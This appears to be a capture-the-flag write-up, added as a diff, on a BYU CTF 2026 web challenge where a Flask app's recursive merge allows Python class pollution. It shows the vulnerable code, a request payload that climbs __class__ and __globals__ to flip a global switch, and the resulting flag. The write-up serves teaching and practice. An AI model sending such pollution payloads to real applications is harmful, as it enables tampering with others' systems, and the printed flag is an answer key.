@@ -1,0 +1,99 @@
+---
+title: 'BYU CTF 2026 - My Cat Website'
+description: 'Polluting a Python module global through a recursive merge to flip the give_flag switch and unlock the flag'
+date: 2026-05-30
+tags: ['writeup', 'web', 'class-pollution', 'python', 'byuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> kittiessss
+>
+> https://cats.chals.cyberjousting.com
+
+We get a small Flask app (`dist.zip`) that builds a "cat" out of a JSON body and renders it. The goal is to make it hand us the flag.
+
+## Initial Analysis
+
+The whole app is about 80 lines. The interesting bits of `app.py`:
+
+```python
+# TODO: figure out if I want them to have the flag or not
+give_flag = False
+
+class Cat:
+    is_happy = False
+    def to_dict(self):
+        return {"name": self.name, "age": self.age,
+                "color": self.color, "is_happy": self.is_happy}
+
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+@app.route("/cat", methods=["POST"])
+def create_cat():
+    data = request.get_json()
+    ...
+    cat = Cat()
+    merge(data, cat)               # attacker-controlled dict merged onto an object
+    cat = cat.to_dict()
+    if give_flag and cat.get("is_happy"):
+        return render_template("flag.html", cat=cat, cat_ascii=cat_ascii)
+    return render_template("cat.html", ascii_art=random.choice(cat_ascii), **cat)
+```
+
+To reach `flag.html` we need **two** things to be true at the same time:
+
+1. the module-level global `give_flag` must be truthy, and
+2. `is_happy` must be truthy.
+
+`is_happy` is easy (just send it). `give_flag` is a global that is never set to `True` anywhere, so we need a way to reach out and change it.
+
+## The Vulnerability
+
+This is classic **Python class pollution** (the Python cousin of JS prototype pollution). `merge(data, cat)` walks our JSON and, for any nested dict, recurses using `getattr` / `setattr` on arbitrary attribute names. That lets us climb Python's object graph from the `Cat` instance all the way to the module globals:
+
+```
+cat.__class__            -> the Cat class
+        .to_dict         -> the to_dict function object
+        .__globals__     -> the module global namespace (a real dict)
+        ["give_flag"]    -> overwrite the global!
+```
+
+Why it lands on the global: when the recursion finally reaches `__globals__`, that object **does** implement `__getitem__` (it is a dict), so `merge` takes the first branch and does `dst["give_flag"] = True`, mutating the live module namespace.
+
+## Exploitation
+
+Send `is_happy` plus the pollution chain in one request:
+
+```python
+import requests
+
+payload = {
+    "name": "kitty", "age": 1, "color": "black",
+    "is_happy": True,
+    "__class__": {"to_dict": {"__globals__": {"give_flag": True}}},
+}
+r = requests.post("https://cats.chals.cyberjousting.com/cat", json=payload)
+print(r.text)   # flag.html with the flag
+```
+
+The global flips to `True`, `is_happy` is `True`, and the app renders `flag.html`.
+
+## Flag
+
+```
+byuctf{y0u_m4d3_k1tty_h4ppy}
+```
